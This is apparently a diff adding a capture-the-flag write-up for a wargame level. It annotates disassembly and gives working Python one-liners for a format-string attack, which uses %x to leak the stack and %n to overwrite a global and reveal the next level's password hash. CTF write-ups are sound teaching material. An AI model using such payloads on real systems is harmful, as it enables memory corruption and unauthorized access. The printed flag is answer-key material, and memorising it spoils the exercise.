@@ -1,0 +1,20 @@
+# Call to `fgets` which is protected against buffer overflow
+=> 0x804847a <n+35>:	call   0x8048350 <fgets@plt>
+
+# We can see a call to `printf` with whatever we enter previously as the string argument
+=> 0x8048450 <p+12>:	call   0x8048340 <printf@plt>
+
+# A `cmp` is made with a uninitialize variable
+   0x804848d <n+54>:	mov    eax,ds:0x8049810
+=> 0x8048492 <n+59>:	cmp    eax,0x1025544
+# if this check succeed the `.pass` file is print with `system("/bin/cat /home/user/level5/.pass")`
+
+# We will use the Format String Attack
+# First we need to print the memory until we reach the address of the variable we wish to modify
+$> python -c "print '\x10\x98\x04\x08' + '%x '*12" | ./level4
+b7ff26b0 bffff804 b7fd0ff4 0 0 bffff7c8 804848d bffff5c0 200 b7fd1ac0 b7ff37d0 8049810
+
+# Then we use the %n modifier to change the content of this variable
+$> python -c "print '\x10\x98\x04\x08' + '%16930112x%12\$n'" | ./level4
+[...]
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
